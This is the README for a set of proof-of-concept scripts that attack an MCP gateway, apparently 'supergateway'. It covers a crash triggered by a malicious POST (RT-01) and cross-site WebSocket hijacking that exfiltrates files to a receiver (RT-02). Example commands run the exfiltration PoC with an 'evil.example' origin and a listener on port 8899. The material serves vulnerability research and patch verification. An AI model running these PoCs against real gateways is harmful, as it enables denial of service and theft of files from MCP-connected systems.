# PoCs and harnesses

Requires: Node.js 22+/npm, Python 3, `curl`, `bash`, and a vulnerable build produced by `../scripts/bootstrap.sh`.

| Script | Purpose |
|---|---|
| `rt01_harness.sh [payload] [port]` | Self-contained RT-01 run: starts the gateway, opens a victim SSE stream, sends the malicious POST, confirms death |
| `rt01_exploit.sh <base-url> [message-path]` | RT-01 against an existing gateway |
| `cswsh_ws_poc.js <ws-url> <file> <listener> [origin]` | Node CSWSH client; exit `0` = exfiltrated and delivered, `2` = upgrade refused, `3` = timeout. Set `SGAUTH="Bearer <key>"` to authenticate |
| `cswsh_browser.html` | Real-browser CSWSH page; query params `ws`, `file`, `recv` |
| `receiver.py [port]` | Stores POST `/exfil` bodies under `./received/` |
| `canary_mcp_server.py` | Minimal MCP stdio server exposing `read_file` (lab target) |
| `verify_all.sh [rounds]` | Full sweep (default 3 rounds → 36 checks) |
| `verify_fix.sh` | Applies, builds, tests and reverts `../patches/rt01-map-sessions.patch` |

Examples:

```bash
# RT-01
../scripts/bootstrap.sh
REPO=../.work/supergateway ./rt01_harness.sh toString
./rt01_exploit.sh http://127.0.0.1:18081

# RT-02 (receiver + gateway started separately)
python3 receiver.py 8899 &
../.work/supergateway/dist/index.js --stdio "python3 canary_mcp_server.py" \
  --outputTransport ws --port 18081 --messagePath /ws &
node cswsh_ws_poc.js ws://127.0.0.1:18081/ws ../evidence/canary.txt \
  http://127.0.0.1:8899 http://evil.example
```

Runtime output goes to `../.artifacts/` (git-ignored). Only test systems you own or are authorised to test.
